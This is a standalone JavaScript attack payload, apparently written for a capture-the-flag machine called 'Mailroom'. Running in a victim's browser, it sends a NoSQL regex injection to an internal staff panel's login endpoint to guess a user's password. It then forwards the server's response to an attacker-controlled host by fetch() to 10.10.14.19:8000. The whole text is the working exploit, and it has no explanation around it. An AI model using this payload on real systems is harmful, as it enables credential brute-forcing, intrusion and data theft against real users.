var email = "email=tristan%40mailroom.htb";
var password = "password[$regex]=s.*";
var body = email + "&" + password;
x = new XMLHttpRequest();
x.onload = function() {
    fetch("http://10.10.14.19:8000/" + this.responseText);
};
x.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
x.send(body);